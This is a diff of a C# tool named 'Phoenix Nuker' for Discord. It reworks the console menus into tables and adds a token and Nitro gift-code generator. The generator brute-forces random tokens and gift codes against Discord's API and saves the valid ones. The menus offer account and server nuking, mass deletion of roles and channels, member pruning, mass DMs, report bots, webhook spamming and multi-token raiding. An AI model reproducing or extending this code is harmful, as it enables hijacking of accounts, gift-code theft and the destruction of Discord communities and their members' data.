@@ -17,6 +17,7 @@ using Org.BouncyCastle.Crypto.Engines;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Collections.Generic;
+using BetterConsoleTables;
 
 /* 
        │ Author       : extatent
@@ -29,7 +30,7 @@ namespace nuker
     class Program
     {
         #region Configs
-        public static string version = "6";
+        public static string version = "7";
         public static string token;
         public static int WaitTimeLong = 2000;
 
@@ -65,16 +66,14 @@ namespace nuker
             Console.Clear();
             Console.WriteLine();
             Console.WriteLine();
-            Console.WriteLine();
             string phoenix = @"                                  ██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗██╗  ██╗
                                   ██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║██║╚██╗██╔╝
                                   ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ 
                                   ██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
 " + " > GitHub: github.com/extatent" + @"    ██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗
-" + " > Discord: discord.gg/FT9UZAxAhx " + @"╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
+                                  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                                                       ";
             Console.WriteWithGradient(phoenix, Color.OrangeRed, Color.Yellow, 16);
-            Console.WriteLine();
             Console.WriteLine();
             Console.WriteLine();
         }
@@ -157,10 +156,11 @@ namespace nuker
 
             try
             {
-                Console.WriteLine("{0,-20} {1,32}", "|[01] Login with config token", "|[02] Login with your token");
-                Console.WriteLine("{0,-20} {1,31}", "|[03] MultiToken Raider", "|[04] Fetch User IDs");
-                Console.WriteLine("|[05] Exit");
-
+                ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
+                Table table = new Table(headers).AddRow("01", "Login With Config Token", "04", "Fetch User IDs").AddRow("02", "Login With DiscordApp Token", "05", "Token & Nitro Generator").AddRow("03", "Multi Token Raider", "06", "Exit");
+                table.Config = TableConfiguration.Unicode();
+                Console.Write(table.ToString());
+                Console.WriteLine();
                 Console.WriteLine();
                 Console.Write("Your choice: ");
                 int options = int.Parse(Console.ReadLine());
@@ -185,6 +185,10 @@ namespace nuker
                                 if (t0ken.Contains("\""))
                                 {
                                     t0ken = t0ken.Replace("\"", "");
+                                }
+                                if (t0ken.Contains("'"))
+                                {
+                                    t0ken = t0ken.Replace("'", "");
                                 }
 
                                 SaveConfig(t0ken);
@@ -254,6 +258,9 @@ namespace nuker
                         Start();
                         break;
                     case 5:
+                        Generator();
+                        break;
+                    case 6:
                         Environment.Exit(0);
                         break;
                 }
@@ -270,6 +277,150 @@ namespace nuker
         }
         #endregion
 
+        #region Token & Nitro Generator
+        private static Random random = new Random();
+
+        public static string GenString(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
+            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+
+        static void Generator()
+        {
+            try
+            {
+                GetConfig();
+                Console.Clear();
+                WriteLogo();
+                ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
+                Table table = new Table(headers).AddRow("01", "Token Generator", "03", "Go Back").AddRow("02", "Nitro Generator", "04", "Exit");
+                table.Config = TableConfiguration.Unicode();
+                Console.Write(table.ToString());
+                Console.WriteLine();
+                Console.WriteLine();
+                Console.Write("Your choice: ");
+                int option = Convert.ToInt32(Console.ReadLine());
+                switch (option)
+                {
+                    default:
+                        Console.WriteLine("Not a valid option.");
+                        Thread.Sleep(WaitTimeLong);
+                        Console.Clear();
+                        Generator();
+                        break;
+                    case 1:
+                        try
+                        {
+                            Console.Clear();
+                            WriteLogo();
+                            Console.Write("Count: ");
+                            string count = Console.ReadLine();
+                            Console.Clear();
+                            WriteLogo();
+                            if (!File.Exists("tokens.txt"))
+                            {
+                                File.Create("tokens.txt").Dispose();
+                            }
+                            Console.ReplaceAllColorsWithDefaults();
+                            for (int i = 0; i < int.Parse(count); i++)
+                            {
+                                string token = string.Format("{0}.{1}.{2}", GenString(24), GenString(6), GenString(38));
+                                try
+                                {
+                                    HttpRequest request = new HttpRequest();
+                                    request.AddHeader("Authorization", token);
+                                    request.Get($"https://discord.com/api/v{Config.APIVersion}/users/@me");
+                                    request.Close();
+                                    Console.WriteLine(token, Color.Lime);
+                                    File.AppendAllText("valid.txt", token + Environment.NewLine);
+                                }
+                                catch
+                                {
+                                    Console.WriteLine(token, Color.Red);
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine(ex.Message);
+                            Thread.Sleep(WaitTimeLong);
+                        }
+                        Console.WriteLine();
+                        Console.WriteLine("Done. The valid tokens were saved to tokens.txt");
+                        Thread.Sleep(2000);
+                        Generator();
+                        break;
+                    case 2:
+                        try
+                        {
+                            Console.Clear();
+                            WriteLogo();
+                            Console.WriteLine("You must have a valid token added in the config.json (for the checker)");
+                            Console.WriteLine();
+                            Console.Write("Count: ");
+                            string count = Console.ReadLine();
+                            Console.Clear();
+                            WriteLogo();
+                            if (!File.Exists("nitro.txt"))
+                            {
+                                File.Create("nitro.txt").Dispose();
+                            }
+                            Console.ReplaceAllColorsWithDefaults();
+                            for (int i = 0; i < int.Parse(count); i++)
+                            {
+                                string code = string.Format("{0}", GenString(16));
+                                try
+                                {
+                                    HttpRequest request = new HttpRequest();
+                                    try
+                                    {
+                                        request.AddHeader("Authorization", token);
+                                    }
+                                    catch
+                                    {
+                                        request.AddHeader("Authorization", GetToken());
+                                    }
+                                    request.Get($"https://discord.com/api/v{Config.APIVersion}/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true");
+                                    request.Close();
+                                    Console.WriteLine("https://discord.gift/" + code, Color.Lime);
+                                    File.AppendAllText("valid.txt", "https://discord.gift/" + code + Environment.NewLine);
+                                }
+                                catch
+                                {
+                                    Console.WriteLine("https://discord.gift/" + code, Color.Red);
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine(ex.Message);
+                            Thread.Sleep(WaitTimeLong);
+                        }
+                        Console.WriteLine();
+                        Console.WriteLine("Done. The valid codes were saved to nitro.txt");
+                        Thread.Sleep(2000);
+                        Generator();
+                        break;
+                    case 3:
+                        Console.Clear();
+                        WriteLogo();
+                        Start();
+                        break;
+                    case 4:
+                        Environment.Exit(0);
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                Thread.Sleep(WaitTimeLong);
+                Generator();
+            }
+        }
+        #endregion
+
         #region Options
         static void Options()
         {
@@ -278,10 +429,11 @@ namespace nuker
                 Console.Clear();
                 WriteLogo();
                 Console.Title = $"Phoenix Nuker | " + User.GetUsername(token);
-                Console.WriteLine("{0,-20} {1,34}", "|[01] Account nuker", "|[02] Server nuker");
-                Console.WriteLine("{0,-20} {1,37}", "|[03] Report bot", "|[04] Webhook spammer");
-                Console.WriteLine("{0,-20} {1,18}", "|[05] Login to other account", "|[06] Exit");
-
+                ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
+                Table table = new Table(headers).AddRow("01", "Account Nuker", "04", "Webhook Spammer").AddRow("02", "Server Nuker", "05", "Login To Other Account").AddRow("03", "Report Bot", "06", "Exit");
+                table.Config = TableConfiguration.Unicode();
+                Console.Write(table.ToString());
+                Console.WriteLine();
                 Console.WriteLine();
                 Console.Write("Your choice: ");
                 int option = Convert.ToInt32(Console.ReadLine());
@@ -349,7 +501,11 @@ namespace nuker
                             string messageid = Console.ReadLine();
                             Console.Clear();
                             WriteLogo();
-                            Console.WriteLine("[1] Illegal Content\n[2] Harrassment\n[3] Spam or Phishing Links\n[4] Self harm\n[5] NSFW");
+                            ColumnHeader[] headers2 = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
+                            Table table2 = new Table(headers2).AddRow("01", "Illegal Content").AddRow("02", "Harrassment").AddRow("03", "Spam or Phishing Links").AddRow("04", "Self harm").AddRow("05", "NSFW");
+                            table2.Config = TableConfiguration.Unicode();
+                            Console.Write(table2.ToString());
+                            Console.WriteLine();
                             Console.WriteLine();
                             Console.Write("Your choice: ");
                             string reason = Console.ReadLine();
@@ -532,15 +688,12 @@ namespace nuker
             {
                 Console.Clear();
                 WriteLogo();
-
                 Console.ForegroundColor = Color.Yellow;
-                Console.WriteLine("{0,-20} {1,25}", "|[01] Join Guild", "|[02] Leave Guild");
-                Console.WriteLine("{0,-20} {1,18}", "|[03] Add Friend", "|[04] Spam");
-                Console.WriteLine("{0,-20} {1,24}", "|[05] Add Reaction", "|[06] Join Group");
-                Console.WriteLine("{0,-20} {1,21}", "|[07] Block User", "|[08] DM User");
-                Console.WriteLine("{0,-20} {1,23}", "|[09] Leave Group", "|[10] Fake Type");
-                Console.WriteLine("{0,-20} {1,18}", "|[11] Go Back", "|[12] Exit");
-
+                ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left),  };
+                Table table = new Table(headers).AddRow("01", "Join Guild", "07", "Block User").AddRow("02", "Leave Guild", "08", "DM User").AddRow("03", "Add Friend", "09", "Leave Group").AddRow("04", "Spam", "10", "Fake Type").AddRow("05", "Add Reaction", "11", "Go Back").AddRow("06", "Join Group", "12", "Exit");
+                table.Config = TableConfiguration.Unicode();
+                Console.Write(table.ToString());
+                Console.WriteLine();
                 Console.WriteLine();
                 Console.Write("Your choice: ");
                 int option = Convert.ToInt32(Console.ReadLine());
@@ -674,7 +827,11 @@ namespace nuker
                             ulong mid = ulong.Parse(Console.ReadLine());
                             Console.Clear();
                             WriteLogo();
-                            Console.WriteLine("[1] Heart\n[2] White Check Mark\n[3] Regional Indicator L\n[4] Regional Indicator W\n[5] Middle Finger\n[6] Billed Cap\n[7] Negative Squared Cross Mark\n[8] Neutral Face\n[9] Nerd Face\n[10] Joy");
+                            ColumnHeader[] headers2 = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
+                            Table table2 = new Table(headers2).AddRow("01", "Heart", "06", "Billed Cap").AddRow("02", "White Check Mark", "07", "Negative Squared Cross Mark").AddRow("03", "Regional Indicator L", "08", "Neutral Face").AddRow("04", "Regional Indicator W", "09", "Nerd Face").AddRow("05", "Middle Finger", "10", "Joy");
+                            table2.Config = TableConfiguration.Unicode();
+                            Console.Write(table2.ToString());
+                            Console.WriteLine();
                             Console.WriteLine();
                             Console.Write("Your choice: ");
                             string choice = Console.ReadLine();
@@ -903,17 +1060,12 @@ namespace nuker
         static void AccountNuker()
         {
             WriteLogo();
-
             Console.ForegroundColor = Color.Yellow;
-            Console.WriteLine("{0,-20} {1,35}", "|[01] Edit Profile", "|[02] Leave/Delete Guilds");
-            Console.WriteLine("{0,-20} {1,26}", "|[03] Clear Relationships", "|[04] Leave HypeSquad");
-            Console.WriteLine("{0,-20} {1,28}", "|[05] Remove Connections", "|[06] Deauthorize Apps");
-            Console.WriteLine("{0,-20} {1,24}", "|[07] Mass Create Guilds", "|[08] Seizure Mode");
-            Console.WriteLine("{0,-20} {1,23}", "|[09] Confuse Mode", "|[10] Mass DM");
-            Console.WriteLine("{0,-20} {1,35}", "|[11] User Info", "|[12] Block Relationships");
-            Console.WriteLine("{0,-20} {1,23}", "|[13] Delete DMs", "|[14] Go Back");
-            Console.WriteLine("|[15] Exit");
-
+            ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
+            Table table = new Table(headers).AddRow("01", "Edit Profile", "07", "Mass Create Guilds", "13", "Delete DMs").AddRow("02", "Leave/Delete Guilds", "08", "Seizure Mode", "14", "Go Back").AddRow("03", "Clear Relationships", "09", "Confuse Mode", "15", "Exit").AddRow("04", "Leave HypeSquad", "10", "Mass DM").AddRow("05", "Remove Connections", "11", "User Info").AddRow("06", "Deauthorize Apps", "12", "Block Relationships");
+            table.Config = TableConfiguration.Unicode();
+            Console.Write(table.ToString());
+            Console.WriteLine();
             Console.WriteLine();
             Console.Write("Your choice: ");
             int option = Convert.ToInt32(Console.ReadLine());
@@ -928,7 +1080,11 @@ namespace nuker
                 case 1:
                     Console.Clear();
                     WriteLogo();
-                    Console.WriteLine("HypeSquad:\n[0] None\n[1] Bravery\n[2] Brilliance\n[3] Balance");
+                    ColumnHeader[] headers2 = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left)};
+                    Table table2 = new Table(headers2).AddRow("00", "None").AddRow("01", "Bravery").AddRow("02", "Brilliance").AddRow("03", "Balance");
+                    table2.Config = TableConfiguration.Unicode();
+                    Console.Write(table2.ToString());
+                    Console.WriteLine();
                     Console.WriteLine();
                     Console.Write("Your choice: ");
                     string hypesquad = Console.ReadLine();
@@ -1072,21 +1228,12 @@ namespace nuker
         static void ServerNuker()
         {
             WriteLogo();
-
             Console.ForegroundColor = Color.Yellow;
-            Console.WriteLine("{0,-20} {1,30}", "|[01] Delete All Roles", "|[02] Remove All Bans");
-            Console.WriteLine("{0,-20} {1,29}", "|[03] Delete All Channels", "|[04] Delete All Emojis");
-            Console.WriteLine("{0,-20} {1,30}", "|[05] Delete All Invites", "|[06] Mass Create Roles");
-            Console.WriteLine("{0,-20} {1,24}", "|[07] Mass Create Channels", "|[08] Prune Members");
-            Console.WriteLine("{0,-20} {1,32}", "|[09] Remove Integrations", "|[10] Delete All Reactions");
-            Console.WriteLine("{0,-20} {1,36}", "|[11] Server Info", "|[12] Leave/Delete Server");
-            Console.WriteLine("{0,-20} {1,26}", "|[13] Msg in every channel", "|[14] Delete Stickers");
-            Console.WriteLine("{0,-20} {1,45}", "|[15] Mass DM", "|[16] Delete Auto Moderation Rules");
-            Console.WriteLine("{0,-20} {1,41}", "|[17] Mass Create Invites", "|[18] Delete Guild Scheduled Events");
-            Console.WriteLine("{0,-20} {1,32}", "|[19] Delete Guild Template", "|[20] Delete Stage Instances");
-            Console.WriteLine("{0,-20} {1,23}", "|[21] Delete Webhooks", "|[22] Go Back");
-            Console.WriteLine("|[23] Exit");
-
+            ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
+            Table table = new Table(headers).AddRow("01", "Delete All Roles", "09", "Remove Integrations", "17", "Mass Create Invites").AddRow("02", "Remove All Bans", "10", "Delete All Reactions", "18", "Delete Guild Scheduled Events").AddRow("03", "Delete All Channels", "11", "Server Info", "19", "Delete Guild Template").AddRow("04", "Delete All Emojis", "12", "Leave/Delete Server", "20", "Delete Stage Instances").AddRow("05", "Delete All Invites", "13", "Msg In Every Channel", "21", "Delete Webhooks").AddRow("06", "Mass Create Roles", "14", "Delete Stickers", "22", "Go Back").AddRow("07", "Mass Create Channels", "15", "Mass DM", "23", "Exit").AddRow("08", "Prune Members", "16", "Delete Auto Moderation Rules");
+            table.Config = TableConfiguration.Unicode();
+            Console.Write(table.ToString());
+            Console.WriteLine();
             Console.WriteLine();
             Console.Write("Your choice: ");
             int option = Convert.ToInt32(Console.ReadLine());
@@ -1249,8 +1396,11 @@ namespace nuker
                     {
                         Console.Clear();
                         WriteLogo();
-                        Console.WriteLine("[1] Spam");
-                        Console.WriteLine("[2] One Message");
+                        ColumnHeader[] headers2 = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
+                        Table table2 = new Table(headers2).AddRow("01", "Spam").AddRow("02", "One Message");
+                        table2.Config = TableConfiguration.Unicode();
+                        Console.Write(table2.ToString());
+                        Console.WriteLine();
                         Console.WriteLine();
                         Console.Write("Your choice: ");
                         string choice = Console.ReadLine();
